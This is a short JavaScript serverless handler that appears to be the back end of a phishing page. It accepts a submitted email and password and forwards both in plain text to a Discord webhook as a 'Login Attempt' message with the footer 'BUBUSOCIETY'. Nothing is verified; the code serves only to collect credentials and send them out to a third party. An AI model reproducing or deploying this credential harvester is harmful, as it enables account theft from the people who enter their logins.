export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    
    const { email, password } = req.body;
    const webhookURL = process.env.WEBHOOK;

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: "Login Attempt",
                color: 0x5865F2,
                fields: [
                    { name: "Email", value: email, inline: true },
                    { name: "Password", value: password, inline: true }
                ],
                footer: { text: "BUBUSOCIETY" },
                timestamp: new Date()
            }]
        })
    });

    res.status(200).json({ message: "Sent" });
}